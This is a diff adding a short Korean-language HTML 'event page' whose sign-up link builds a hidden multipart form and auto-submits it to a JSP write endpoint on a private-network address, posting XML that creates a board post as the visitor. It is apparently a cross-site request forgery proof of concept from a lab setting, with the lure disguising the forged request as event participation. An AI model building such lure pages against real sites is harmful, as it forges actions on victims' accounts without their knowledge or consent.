@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>이벤트 페이지</title>
+</head>
+<body>
+  <a href="#" onclick="submitPost()">[이벤트 참여하기]</a>
+
+  <script>
+    function submitPost() {
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = "http://192.168.59.129:8080/write/writeProcess.jsp";
+      form.enctype = "multipart/form-data";
+
+      const input = document.createElement("input");
+      input.type = "hidden";
+      input.name = "xml";
+      input.value = '<post><title>이벤트 참여</title><content>이 사용자가 이벤트에 참여했습니다.</content></post>';
+      form.appendChild(input);
+
+      document.body.appendChild(form);
+      form.submit();
+
+    }
+  </script>
+
+</body>
+</html>
